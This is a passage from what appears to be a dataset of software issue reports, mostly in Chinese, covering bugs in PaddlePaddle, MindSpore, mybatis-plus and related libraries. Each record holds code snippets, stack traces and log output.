_get_func_graph_proto(self, exec_id, ir_type=""onnx_ir"", use_prefix=False): """"""Get graph proto from pipeline."""""" if use_prefix: exec_id = self.phase_prefix + exec_id if self._executor.has_compiled(exec_id) is False: return None return self._executor.get_func_graph_proto(exec_id, ir_type)"
Discuss possible fluid imperative programming paradigms,"Abhinav, Helin and I have discuss possibilities for implement imperative paradigms. Here are two variants of fit a line example, one implemented using full imperative, the other using a variant of the current API. This proposal will need some discussion. Note: These examples showcase possible python API/operators that may not currently exist in Paddle. Fit a line with Imperative In this scenario, the fluid executor will run after the block exits. Note this will require some methods to change (fluid.optimizer), which may affect backwards compatibility. Fit a line without full imperative, but modified fluid api.   <code>: def train(place): with fluid.Program(place): batch_reader = fluid.layers.batch_reader( filename = './flowers.recordio', type='recordio', batch_size=100, shape=[[13], [1]], dtype=['float32', 'float32']) with fluid.While(step=100): x, y = fluid.layers.next_batch(batch_reader) y_predict = fluid.layers.fc(input=x, size=1, act=None) cost = fluid.layers.square_error_cost(input=y_predict, label=y) avg_cost = fluid.layers.mean(cost) sgd_optimizer = fluid.optimizer.SGD(learning_rate=0.001) sgd_optimizer.minimize(avg_cost) #fluid.Print(avg_cost) # This example shows how to fetch variables from within the scope # during execution of the ProgramDesc. A new fetch operator can # be added to the ProgramDesc. Its job will be to send the data to # the python host (using sockets or RPC), and wait for the host to # complete the request. On the python side, the user can implement # some logic (like log the data, or send to database, ect). fluid.fetch([avg_cost], lambda ac: print(ac)) if __name__ == '__main__': train(fluid.CPUPlace) def train(place): with fluid.program(place): batch_reader = fluid.layers.batch_reader( filename = './flowers.recordio', type='recordio', batch_size=100, shape=[[13], [1]], dtype=['float32', 'float32']) x, y = fluid.layers.next_batch(batch_reader) y_predict = fluid.layers.fc(input=x, size=1, act=None) cost = fluid.layers.square_error_cost(input=y_predict, label=y) avg_cost = fluid.layers.mean(cost) sgd_optimizer = fluid.optimizer.SGD(learning_rate=0.001) sgd_optimizer.minimize(avg_cost) fluid.initialize_variables() for pass_id in range(100): avg_loss_value, = fluid.run(place=fluid.CPUPlace(), fetch_list=[avg_cost]) print(avg_loss_value) if __name__ == '__main__': train(fluid.CPUPlace)"
oauth2 SecurityUtils 莫名其妙的异常,"环境信息 pigx版本: 3.0.3 是否修改包名: 否 在同一个模块下,两个不同的Controller 调用SecurityUtils.getUser()出现不一样的结果. 一个Controller 返回正常的PigUser对象,而另一个Controller中却是anonymousUser 无法转换成Piguser. 不知道问题何在.   <code>: // 正常的Controller @RestController @RequiredArgsConstructor @RequestMapping(""/sysexperiment"") @Api(value = ""sysexperiment"", tags = """") public class SysExperimentController { @ApiOperation(value = ""分页查询"", notes = ""分页查询"") @GetMapping(""/page"") public R getSysExperimentPage(Page page, SysExperiment sysExperiment) { System.out.println(SecurityUtils.getUser().toString()); return R.ok(); } } // 异常的Controller @RestController @RequiredArgsConstructor @RequestMapping(""/stExperiment"" ) @Api(value = ""sysStudentExperiment"", tags = """") public class SysStudentExperimentController { @ApiOperation(value = """", notes = """") @SysLog("""") @GetMapping(""/experiment"") public R&lt;List&lt;ExperimentVo&gt;&gt; getNodeExperimentList() { System.out.println(SecurityUtils.getUser().toString()); return R.ok(new ArrayList&lt;&gt;()); } }"
GELU算子错误并对BERT模型精度有显著影响,"/device ascend /device gpu -- MindSpore version : 所有版本 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 这里给出MindSpore和Pytorch的TestCase Pytorch: mindspore: 由于BERT的模型过大，这里给出写好的ut，用于测试整网的精度 BERT加载huggingface权重的UT 此外，这里给出根据公式实现的GELU代码： 运行简单的单算子UT 分别使用nn.GELU和根据公式实现的GELU，观察BERT模型与Pytorch实现的BERT模型最终精度的差异 2.1. 下载bert checkpoint 2.2 修改转换为MindSpore的ckpt中的路径，并运行进行转换 2.3 修改BERT加载huggingface权重的UT中的转换后ckpt的路径，运行ut 首先看单算子结果，Pytorch UT打印结果如下： MindSpore单算子打印结果如下： 自实现的GELU单算子打印结果： 可以看到自实现的GELU结果明细更接近于Pytorch的结果。接下来再看BERT的精度影响 给出的UT设置的精度误差范围为1e-5，使用自定义的GELU，结果如下： 由于UT不会通过 这里加入一行 打印一下结果 打印得到的结果差异如下： 可以看到，使用nn.GELU得到的BERT输出，经过12层累积，已经达到了1e-2~1e-3的量级，导致最终输出结果和huggingface的BERT(其实使用的是谷歌原版的ckpt)有差异。 实现正确的nn.GELU   <code>: import torch import torch.nn as nn import numpy as np x = torch.Tensor(np.array([[-1.0, 4.0, -8.0], [2.0, -5.0, 9.0]])) gelu = nn.GELU() output = gelu(x) print(output.numpy()) import mindspore import mindspore.nn as nn import numpy as np from mindspore import Tensor x = Tensor(np.array([[-1.0, 4.0, -8.0], [2.0, -5.0, 9.0]]), mindspore.float32) gelu = nn.GELU() output = gelu(x) print(output) import mindspore.nn as nn import mindspore.ops as P from mindspore import Tensor class GELU(nn.Cell): def __init__(self): super().__init__() self.erf = P.Erf() self.sqrt = P.Sqrt() self.const0 = Tensor(0.5, mindspore.float32) self.const1 = Tensor(1.0, mindspore.float32) self.const2 = Tensor(2.0, mindspore.float32) def construct(self, x): return x * self.const0 * (self.const1 + self.erf(x / self.sqrt(self.const2))) wget https://huggingface.co/bert-base-uncased/resolve/main/pytorch_model.bin pytest tests/test_modeling_bert.py [[-1.5865526e-01 3.9998734e+00 -4.9767683e-15] [ 1.9544997e+00 -1.4332579e-06 9.0000000e+00]] [[-1.5880802e-01 3.9999299e+00 -0.0000000e+00] [ 1.9545977e+00 -2.9802322e-07 9.0000000e+00]] [[-1.5865526e-01 3.9998732e+00 -0.0000000e+00] [ 1.9544997e+00 -1.4901161e-06 9.0000000e+00]] print(outputs.asnumpy() - outputs_pt[0].detach().numpy()) [[[ 0.01399123 -0.00403032 -0.00485468 ... 0.00404024 0.00145653 -0.00331685] [ 0.01752505 -0.00085748 -0.00532126 ... 0.00735232 -0.00352979 -0.00993931] [ 0.01642793 -0.00031449 -0.00523794 ... 0.00591761 -0.00388643 -0.00918174] ... [ 0.00811747 0.00413671 -0.01118484 ... 0.00297108 -0.00152439 -0.00781476] [ 0.00766036 0.00439882 -0.01071131 ... 0.00276172 -0.0015201 -0.00750977] [ 0.0098173 0.00423741 -0.00925469 ... 0.00283027 -0.00100011 -0.00768948]]]"
自定义coluomn的TableId注解自动生成脚本有误,"mybatis配置使用mapUnderscoreToCamelCase 最新版，自动生成的selectId是""select customerCode from customer where customer_code = ?"" 期望是""select customer_code as customerCode from customer where customer_code = ?"" 查看com/baomidou/mybatisplus/toolkit/TableInfoHelper.java源码 版本2.0.5的代码是这样子的 而版本2.0.7的代码是这样子的 不知道是不是把tableInfo.setKeyRelated(true); 误删了？   <code>: &lt;configuration&gt; &lt;settings&gt; &lt;setting name=""mapUnderscoreToCamelCase"" value=""true""/&gt; &lt;/settings&gt; &lt;/configuration&gt; @TableId private String customerCode; column = StringUtils.camelToUnderline(column); // fixed 217 tableInfo.setKeyRelated(true); column = StringUtils.camelToUnderline(column);"
need MKLDNNPlace,"When I am trying to implement , like . The first thing need to do is to check , just like here. Then we need add definition and some relevant functions at least.   <code>: conv_mkldnn_op.cc conv_cudnn_op.cu.cc platform::is_mkldnn_place MKLDNNPlace"
在训练时报错Assertion `label[i] >= 0 ,"PaddlePaddle 自己编译的，应该比较1.2.0高一些 Python 3.5 Ubuntu 16.04 问题 在训练的时候报以下错误：   <code>: /home/test/Downloads/Paddle/paddle/fluid/operators/math/cross_entropy.cu:40 Assertion `label[i] &gt;= 0 &amp;&amp; label[i] &lt; D || label[i] == ignore_index` failed. /home/test/Downloads/Paddle/paddle/fluid/operators/math/cross_entropy.cu:40 Assertion `label[i] &gt;= 0 &amp;&amp; label[i] &lt; D || label[i] == ignore_index` failed. /home/test/Downloads/Paddle/paddle/fluid/operators/math/cross_entropy.cu:40 Assertion `label[i] &gt;= 0 &amp;&amp; label[i] &lt; D || label[i] == ignore_index` failed. /home/test/Downloads/Paddle/paddle/fluid/operators/math/cross_entropy.cu:40 Assertion `label[i] &gt;= 0 &amp;&amp; label[i] &lt; D || label[i] == ignore_index` failed. Traceback (most recent call last): File ""train.py"", line 79, in &lt;module&gt; fetch_list=[avg_cost, accuracy, param_name]) File ""/usr/local/lib/python3.5/dist-packages/paddle/fluid/executor.py"", line 472, in run self.executor.run(program.desc, scope, 0, True, True) paddle.fluid.core.EnforceNotMet: CUDNN_STATUS_EXECUTION_FAILED at [/home/test/Downloads/Paddle/paddle/fluid/operators/batch_norm_op.cu.cc:289] PaddlePaddle Call Stacks: 0 0x7f1ee6150a27p paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) + 727 1 0x7f1ee651a823p paddle::operators::BatchNormGradKernel&lt;paddle::platform::CUDADeviceContext, float&gt;::Compute(paddle::framework::ExecutionContext const&amp;) const + 4499 2 0x7f1ee651b0afp std::_Function_handler&lt;void (paddle::framework::ExecutionContext const&amp;), paddle::framework::OpKernelRegistrarFunctor&lt;paddle::platform::CUDAPlace, false, 0ul, paddle::operators::BatchNormGradKernel&lt;paddle::platform::CUDADeviceContext, float&gt;, paddle::operators::BatchNormGradKernel&lt;paddle::platform::CUDADeviceContext, double&gt;, paddle::operators::BatchNormGradKernel&lt;paddle::platform::CUDADeviceContext, paddle::platform::float16&gt; &gt;::operator()(char const*, char const*) const::{lambda(paddle::framework::ExecutionContext const&amp;)#1}&gt;::_M_invoke(std::_Any_data const&amp;, paddle::framework::ExecutionContext const&amp;) + 47 3 0x7f1ee7b4c6e2p paddle::framework::OperatorWithKernel::RunImpl(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) const + 658 4 0x7f1ee7b465a0p paddle::framework::OperatorBase::Run(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) + 544 5 0x7f1ee6247778p paddle::framework::Executor::RunPreparedContext(paddle::framework::ExecutorPrepareContext*, paddle::framework::Scope*, bool, bool, bool) + 248 6 0x7f1ee624944ap paddle::framework::Executor::Run(paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool) + 154 7 0x7f1ee612e56ap 8 0x7f1ee617f16dp 9 0x4ea137p PyCFunction_Call + 119 10 0x53c176p PyEval_EvalFrameEx + 23030 11 0x53fc97p 12 0x53b83fp PyEval_EvalFrameEx + 20671 13 0x53fc97p 14 0x5409bfp PyEval_EvalCode + 31 15 0x60cb42p 16 0x60efeap PyRun_FileExFlags + 154 17 0x60f7dcp PyRun_SimpleFileExFlags + 444 18 0x640256p Py_Main + 1110 19 0x4d0001p main + 225 20 0x7f1f33c1f830p __libc_start_main + 240 21 0x5d6999p _start + 41"
[ST][MS][Diasater_recover]resnet50 容灾模式下scheduler进程重新拉起后又挂掉,"Hardware Environment() / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version 2.pytest -s test_ms_data_parallel_mode_recovery_twice_resnet50_0001.py 重新拉起后训练正常 责任人 陈刚   <code>: [WARNING] PS(20228,7f8eed842700,python):2022-06-15-16:59:45.355.833 [mindspore/ccsrc/ps/core/communicator/tcp_server.h:55] TcpConnection] TcpConnection is constructed! fd is 21 [WARNING] PS(20228,7f8eed842700,python):2022-06-15-16:59:45.407.275 [mindspore/ccsrc/ps/core/communicator/tcp_server.h:55] TcpConnection] TcpConnection is constructed! fd is 22 [WARNING] PS(20228,7f8eed842700,python):2022-06-15-16:59:45.415.412 [mindspore/ccsrc/ps/core/communicator/tcp_server.h:55] TcpConnection] TcpConnection is constructed! fd is 23 [WARNING] PS(20228,7f8eed842700,python):2022-06-15-16:59:48.337.928 [mindspore/ccsrc/ps/core/communicator/tcp_server.h:55] TcpConnection] TcpConnection is constructed! fd is 24 [WARNING] PS(20228,7f8eed842700,python):2022-06-15-16:59:48.339.362 [mindspore/ccsrc/ps/core/communicator/tcp_server.h:55] TcpConnection] TcpConnection is constructed! fd is 25 [WARNING] PS(20228,7f8eed842700,python):2022-06-15-16:59:48.356.769 [mindspore/ccsrc/ps/core/file_configuration.cc:132] PersistFile] The file path:/home/jenkins/workspace/TDT_deployment/solution_test/cases/03subject_test/00reliability_availability/02reliability_availability_features/05disaster_recovery/resnet50/test_ms_data_parallel_mode_recovery_twice_resnet50_0001/recovery_dir/storage_file_path.json is not exist. create one [WARNING] PS(20228,7f8eed842700,python):2022-06-15-16:59:48.356.890 [mindspore/ccsrc/ps/core/file_configuration.cc:103] PersistNodes] The file path:/home/jenkins/workspace/TDT_deployment/solution_test/cases/03subject_test/00reliability_availability/02reliability_availability_features/05disaster_recovery/resnet50/test_ms_data_parallel_mode_recovery_twice_resnet50_0001/recovery_dir/scheduler_storage_file_path.json is not exist. create one [ERROR] DISTRIBUTED(20228,7f916df02740,python):2022-06-15-16:59:48.357.490 [mindspore/ccsrc/distributed/cluster/cluster_context.cc:207] BuildCluster] Topology build timed out., retry(1/30). [WARNING] ME(20228:140262591440704,MainProcess):2022-06-15-16:59:58.358.606 [mindspore/dataset/core/validator_helpers.py:797] 'RandomCrop' from mindspore.dataset.vision.c_transforms is deprecated from version 1.8 and will be removed in a future version. Use 'RandomCrop' from mindspore.dataset.vision instead. [WARNING] ME(20228:140262591440704,MainProcess):2022-06-15-16:59:58.359.171 [mindspore/dataset/core/validator_helpers.py:797] 'RandomHorizontalFlip' from mindspore.dataset.vision.c_transforms is deprecated from version 1.8 and will be removed in a future version. Use 'RandomHorizontalFlip' from mindspore.dataset.vision instead. [WARNING] ME(20228:140262591440704,MainProcess):2022-06-15-16:59:58.359.381 [mindspore/dataset/core/validator_helpers.py:797] 'Resize' from mindspore.dataset.vision.c_transforms is deprecated from version 1.8 and will be removed in a future version. Use 'Resize' from mindspore.dataset.vision instead. [WARNING] ME(20228:140262591440704,MainProcess):2022-06-15-16:59:58.359.580 [mindspore/dataset/core/validator_helpers.py:797] 'Rescale' from mindspore.dataset.vision.c_transforms is deprecated from version 1.8 and will be removed in a future version. Use 'Rescale' from mindspore.dataset.vision instead. [WARNING] ME(20228:140262591440704,MainProcess):2022-06-15-16:59:58.359.779 [mindspore/dataset/core/validator_helpers.py:797] 'Normalize' from mindspore.dataset.vision.c_transforms is deprecated from version 1.8 and will be removed in a future version. Use 'Normalize' from mindspore.dataset.vision instead. [WARNING] ME(20228:140262591440704,MainProcess):2022-06-15-16:59:58.359.972 [mindspore/dataset/core/validator_helpers.py:797] 'HWC2CHW' from mindspore.dataset.vision.c_transforms is deprecated from version 1.8 and will be removed in a future version. Use 'HWC2CHW' from mindspore.dataset.vision instead. [WARNING] ME(20228:140262591440704,MainProcess):2022-06-15-16:59:58.360.098 [mindspore/dataset/core/validator_helpers.py:797] 'TypeCast' from mindspore.dataset.transforms.c_transforms is deprecated from version 1.8 and will be removed in a future version. Use 'TypeCast' from mindspore.dataset.transforms instead. [WARNING] PS(23746,7f57aea4e700,python):2022-06-15-17:01:42.785.441 [mindspore/ccsrc/ps/core/communicator/tcp_server.h:55] TcpConnection] TcpConnection is constructed! fd is 16 [WARNING] PS(23746,7f57aea4e700,python):2022-06-15-17:01:42.788.553 [mindspore/ccsrc/ps/core/communicator/tcp_server.h:55] TcpConnection] TcpConnection is constructed! fd is 18 [WARNING] PS(23746,7f57aea4e700,python):2022-06-15-17:01:42.788.878 [mindspore/ccsrc/ps/core/communicator/tcp_server.h:55] TcpConnection] TcpConnection is constructed! fd is 19 [WARNING] PS(23746,7f57aea4e700,python):2022-06-15-17:01:45.761.121 [mindspore/ccsrc/ps/core/communicator/tcp_server.h:55] TcpConnection] TcpConnection is constructed! fd is 20 [WARNING] PS(23746,7f57aea4e700,python):2022-06-15-17:01:45.783.625 [mindspore/ccsrc/ps/core/communicator/tcp_server.h:55] TcpConnection] TcpConnection is constructed! fd is 21 [WARNING] PS(23746,7f57aea4e700,python):2022-06-15-17:01:50.396.315 [mindspore/ccsrc/ps/core/communicator/tcp_server.h:55] TcpConnection] TcpConnection is constructed! fd is 22 [WARNING] PS(23746,7f57aea4e700,python):2022-06-15-17:01:50.396.379 [mindspore/ccsrc/ps/core/communicator/tcp_server.h:55] TcpConnection] TcpConnection is constructed! fd is 23 [WARNING] PS(23746,7f57aea4e700,python):2022-06-15-17:01:50.397.111 [mindspore/ccsrc/ps/core/communicator/tcp_server.h:55] TcpConnection] TcpConnection is constructed! fd is 24 [WARNING] PS(23746,7f57aea4e700,python):2022-06-15-17:01:50.397.538 [mindspore/ccsrc/ps/core/communicator/tcp_server.h:55] TcpConnection] TcpConnection is constructed! fd is 25 [WARNING] ME(23746:140025308518208,MainProcess):2022-06-15-17:01:50.415.097 [mindspore/dataset/core/validator_helpers.py:797] 'RandomCrop' from mindspore.dataset.vision.c_transforms is deprecated from version 1.8 and will be removed in a future version. Use 'RandomCrop' from mindspore.dataset.vision instead. [WARNING] ME(23746:140025308518208,MainProcess):2022-06-15-17:01:50.415.713 [mindspore/dataset/core/validator_helpers.py:797] 'RandomHorizontalFlip' from mindspore.dataset.vision.c_transforms is deprecated from version 1.8 and will be removed in a future version. Use 'RandomHorizontalFlip' from mindspore.dataset.vision instead. [WARNING] ME(23746:140025308518208,MainProcess):2022-06-15-17:01:50.415.936 [mindspore/dataset/core/validator_helpers.py:797] 'Resize' from mindspore.dataset.vision.c_transforms is deprecated from version 1.8 and will be removed in a future version. Use 'Resize' from mindspore.dataset.vision instead. [WARNING] ME(23746:140025308518208,MainProcess):2022-06-15-17:01:50.416.326 [mindspore/dataset/core/validator_helpers.py:797] 'Rescale' from mindspore.dataset.vision.c_transforms is deprecated from version 1.8 and will be removed in a future version. Use 'Rescale' from mindspore.dataset.vision instead. [WARNING] ME(23746:140025308518208,MainProcess):2022-06-15-17:01:50.416.545 [mindspore/dataset/core/validator_helpers.py:797] 'Normalize' from mindspore.dataset.vision.c_transforms is deprecated from version 1.8 and will be removed in a future version. Use 'Normalize' from mindspore.dataset.vision instead. [WARNING] ME(23746:140025308518208,MainProcess):2022-06-15-17:01:50.416.734 [mindspore/dataset/core/validator_helpers.py:797] 'HWC2CHW' from mindspore.dataset.vision.c_transforms is deprecated from version 1.8 and will be removed in a future version. Use 'HWC2CHW' from mindspore.dataset.vision instead. [WARNING] ME(23746:140025308518208,MainProcess):2022-06-15-17:01:50.416.857 [mindspore/dataset/core/validator_helpers.py:797] 'TypeCast' from mindspore.dataset.transforms.c_transforms is deprecated from version 1.8 and will be removed in a future version. Use 'TypeCast' from mindspore.dataset.transforms instead. [ERROR] DISTRIBUTED(23746,7f57ad24b700,python):2022-06-15-17:01:55.436.141 [mindspore/ccsrc/distributed/cluster/topology/meta_server_node.cc:171] ProcessRegister] The node: worker_0 have been registered before. [ERROR] DISTRIBUTED(23746,7f57ad24b700,python):2022-06-15-17:01:55.436.434 [mindspore/ccsrc/distributed/cluster/topology/meta_server_node.cc:171] ProcessRegister] The node: worker_2 have been registered before. [ERROR] DISTRIBUTED(23746,7f57ad24b700,python):2022-06-15-17:01:55.436.554 [mindspore/ccsrc/distributed/cluster/topology/meta_server_node.cc:171] ProcessRegister] The node: worker_3 have been registered before. [ERROR] DISTRIBUTED(23746,7f57ad24b700,python):2022-06-15-17:01:55.436.718 [mindspore/ccsrc/distributed/cluster/topology/meta_server_node.cc:171] ProcessRegister] The node: worker_1 have been registered before."
" Cublas error, CUBLAS_STATUS_EXECUTION_FAILED","” 1）PaddlePaddle版本：1.8.1 2）CPU：/ 3）GPU：V100 Driver Version: 418.39 CUDA Version: 10.1 训练信息 1）单机单卡 3）Operator信息：operator &lt; mul &gt; error fluid.install_check()没有问题，但是在训练时出core   <code>: terminate called after throwing an instance of 'paddle::platform::EnforceNotMet' what(): -------------------------------------------- C++ Call Stacks (More useful to developers): -------------------------------------------- 0 std::string paddle::platform::GetTraceBackString&lt;char const*&gt;(char const*&amp;&amp;, char const*, int) 1 paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) 2 void paddle::operators::math::Blas&lt;paddle::platform::CUDADeviceContext&gt;::MatMul&lt;float&gt;(paddle::framework::Tensor const&amp;, bool, paddle::framework::Tensor const&amp;, bool, float, paddle::framework::Tensor*, float) const 3 paddle::operators::MulKernel&lt;paddle::platform::CUDADeviceContext, float&gt;::Compute(paddle::framework::ExecutionContext const&amp;) const 4 std::_Function_handler&lt;void (paddle::framework::ExecutionContext const&amp;), paddle::framework::OpKernelRegistrarFunctor&lt;paddle::platform::CUDAPlace, false, 0ul, paddle::operators::MulKernel&lt;paddle::platform::CUDADeviceContext, float&gt;, paddle::operators::MulKernel&lt;paddle::platform::CUDADeviceContext, double&gt;, paddle::operators::MulKernel&lt;paddle::platform::CUDADeviceContext, paddle::platform::float16&gt; &gt;::operator()(char const*, char const*, int) const::{lambda(paddle::framework::ExecutionContext const&amp;)#1}&gt;::_M_invoke(std::_Any_data const&amp;, paddle::framework::ExecutionContext const&amp;) 5 paddle::framework::OperatorWithKernel::RunImpl(paddle::framework::Scope const&amp;, paddle::platform::Place const&amp;, paddle::framework::RuntimeContext*) const 6 paddle::framework::OperatorWithKernel::RunImpl(paddle::framework::Scope const&amp;, paddle::platform::Place const&amp;) const 7 paddle::framework::OperatorBase::Run(paddle::framework::Scope const&amp;, paddle::platform::Place const&amp;) 8 paddle::framework::HogwildWorker::TrainFilesWithProfiler() ------------------------------------------ Python Call Stacks (More useful to users): ------------------------------------------ File ""/home/users/wangjiawei04/paddle_release_home/python/lib64/python2.7/site-packages/paddle/fluid/framework.py"", line 2610, in append_op attrs=kwargs.get(""attrs"", None)) File ""/home/users/wangjiawei04/paddle_release_home/python/lib64/python2.7/site-packages/paddle/fluid/layer_helper.py"", line 43, in append_op return self.main_program.current_block().append_op(*args, **kwargs) File ""/home/users/wangjiawei04/paddle_release_home/python/lib64/python2.7/site-packages/paddle/fluid/layers/nn.py"", line 1719, in fc ""y_num_col_dims"": 1}) File ""/home/users/wangjiawei04/chengmo/paddle_attention/paddle/train_net.py"", line 639, in fusion_semantic_word bias_attr=fluid.ParamAttr(name=""tdm.cls_fc.bias"")) File ""/home/users/wangjiawei04/chengmo/paddle_attention/paddle/train_net.py"", line 237, in train_net semantic_states, word_states) File ""/home/users/wangjiawei04/chengmo/paddle_attention/paddle/local_train.py"", line 96, in run_train avg_cost, auc = tdm_model.train_net(inputs) File ""/home/users/wangjiawei04/chengmo/paddle_attention/paddle/local_train.py"", line 209, in main run_train(args) File ""/home/users/wangjiawei04/chengmo/paddle_attention/paddle/local_train.py"", line 216, in &lt;module&gt; main(args) ---------------------- Error Message Summary: ---------------------- ExternalError: Cublas error, CUBLAS_STATUS_EXECUTION_FAILED at (/paddle/paddle/fluid/operators/math/blas_impl.cu.h:34) [operator &lt; mul &gt; error] W0528 13:54:15.679564 213705 init.cc:216] Warning: PaddlePaddle catches a failure signal, it may not work properly W0528 13:54:15.679577 213705 init.cc:218] You could check whether you killed PaddlePaddle thread/process accidentally or report the case to PaddlePaddle W0528 13:54:15.679581 213705 init.cc:221] The detail failure signal is: W0528 13:54:15.679586 213705 init.cc:224] *** Aborted at 1590645255 (unix time) try ""date -d @1590645255"" if you are using GNU date *** W0528 13:54:15.684528 213705 init.cc:224] PC: @ 0x0 (unknown) W0528 13:54:15.684717 213705 init.cc:224] *** SIGABRT (@0x520520002dd8f) received by PID 187791 (TID 0x7f609d7cc700) from PID 187791; stack trace: *** W0528 13:54:15.685890 213705 init.cc:224] @ 0x7f60ca1c8160 (unknown) W0528 13:54:15.687609 213705 init.cc:224] @ 0x7f60c97363f7 __GI_raise W0528 13:54:15.688812 213705 init.cc:224] @ 0x7f60c97377d8 __GI_abort W0528 13:54:15.690255 213705 init.cc:224] @ 0x7f5feba34c65 __gnu_cxx::__verbose_terminate_handler() W0528 13:54:15.690800 213705 init.cc:224] @ 0x7f5feba32e06 __cxxabiv1::__terminate() W0528 13:54:15.691521 213705 init.cc:224] @ 0x7f5feba32e33 std::terminate() W0528 13:54:15.692054 213705 init.cc:224] @ 0x7f5feba85935 execute_native_thread_routine W0528 13:54:15.693186 213705 init.cc:224] @ 0x7f60ca1c01c3 start_thread W0528 13:54:15.694511 213705 init.cc:224] @ 0x7f60c97e812d __clone W0528 13:54:15.695627 213705 init.cc:224] @ 0x0 (unknown) I0528 13:54:15.863662 213708 mmap_allocator.cc:124] PID: 213708, MemoryMapFdSet: set size - 0"
Error when transpile program with piecewise_decay to distributed program,"When is defined the pserver side program will have a wrong refer to a block id that doesn't exist on the pserver program. This error was first met by @kolinwei   <code>: piecewise_decay conditional_block optimizer = fluid.optimizer.Momentum( learning_rate=fluid.layers.piecewise_decay( boundaries=bd, values=lr), momentum=0.9, regularization=fluid.regularizer.L2Decay(1e-4))"
Need StringPiece,"As summarized in https://github.com/PaddlePaddle/Paddle/wiki/TensorFlow-Ops-and-Kernels#conclusion, TensorFlow relies on to parse Op definitions. Actually, many Google opened software rely heavily on StringPiece. The difference between and is that owns the string. In particular, it destroys the memory in its destructor, but doesn't. This allows us to pass strings (and/or substrings) between function invocations efficiently. For more about , please refer to this blog post. is a frequently used in Google's codebase. Go types and are almost identical to -- a pointer to the underlying C string and an integer length.   <code>: StringPiece StringPiece std::string std::string StringPiece StringPiece StringPiece string error StringPiece"
字符串根据集合查找返回索引,"JDK版本： openjdk_8_241 hutool版本： 5.5.7 我想要查找到search里面的字符串在s里面的索引集合，+存在索引是1，-存在索引是3，返回{1,3}这样的方法有吗   <code>: String s = ""a+b-c""; String[] search=new String[]{""+"",""-""，""*"",""/""};"
Alias analysis bug in comiling 625.x264_s causing incorrect output,"The bug is in compiling encoder/analyse.c:x264_mb_analyse_inter_b16x16(). The alias analysis bug caused dse phase to delete these 2 iassigns at source line 1659: The bug is due recent addition to take offsets into account, resulting in the same symbol belonging to more than 1 alias classes. See id15 below: This confusion causes the alias between i_halfpel_thresh and p_halfpel_thresh to be missed.   <code>: int i_halfpel_thresh[2] = {INT_MAX, INT_MAX}; Members of alias class 15: %p_halfpel_thresh&lt;0&gt;id15 %p_halfpel_thresh{offset:0}&lt;0&gt;id17 %p_halfpel_thresh{offset:64}&lt;0&gt;id18 %p_halfpel_thresh&lt;0&gt;id33 Alone: %p_halfpel_thresh&lt;-1&gt;id16 Members of alias class 17: %p_halfpel_thresh&lt;0&gt;id15 %p_halfpel_thresh{offset:0}&lt;0&gt;id17 %p_halfpel_thresh&lt;0&gt;id33 Members of alias class 18: %p_halfpel_thresh&lt;0&gt;id15 %p_halfpel_thresh{offset:64}&lt;0&gt;id18 %p_halfpel_thresh&lt;0&gt;id33"
asycn await的异步转同步 增加调用ConfigureAwait(false),"以下代码，在wpf、winform中，按照目前的最新版，会导致软件卡死（在以往的老程序中，可能新增接口方法，但是在旧功能中也会调用兼容）。 在以下异步方法中（以下两个方法只是示例，应该是所有async异步方法都需要增加），增加ConfigureAwait(false)调用，系统正常。 1、   <code>: private void button1_Click(object sender, EventArgs e) { User user = GetAccountCodeAsync().Result; MessageBox.Show(user.Name); } private async Task&lt;User&gt; GetAccountCodeAsync() { return await _db.Queryable&lt;User&gt;().FirstAsync(); }"
[CT][MS][logit]test report fail when dtype is fp64 at cpu,"cpu后端输入dtype是fp64, 正反向有精度问题 / 硬件环境: /device /CPU : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph cpu后端执行测试用例 计算结果正确， 对标通过   <code>: def test_functional_logit_input_dtype_float64_2d(): input_list = [] x0 = Tensor(np.random.randn(102, 75).astype(np.float64)) input_list.append(x0) attributes = {'eps': -0.5588928896271259} fact = LogitMock( attributes=attributes, inputs=input_list) fact.forward_cmp() &gt; fact.grad_cmp() def test_functional_logit_input_dtype_float64_2d(): input_list = [] x0 = Tensor(np.random.randn(102, 75).astype(np.float64)) input_list.append(x0) attributes = {'eps': -0.5588928896271259} fact = LogitMock( attributes=attributes, inputs=input_list) fact.forward_cmp() &gt; fact.grad_cmp() data_expected = array([[ nan, -4.99632232, nan, ..., nan, nan, nan], [ -0....6.13863816], [ 6.04147942, -1.20356489, -1.14330028, ..., 7.37900023, 15.36290122, 1.28983094]]) data_me = array([[ nan, -4.99632263, nan, ..., nan, nan, nan], [ -0....6.13863802], [ 6.04147959, -1.20356488, -1.14330029, ..., 7.37899971, 15.36290169, 1.28983092]]) rtol = 1e-05, atol = 1e-05, equal_nan = True def allclose_nparray(data_expected, data_me, rtol, atol, equal_nan=True): if np.any(np.isnan(data_expected)) or np.any(np.isnan(data_me)): &gt; assert np.allclose(data_expected, data_me, rtol, atol, equal_nan=equal_nan) E AssertionError"
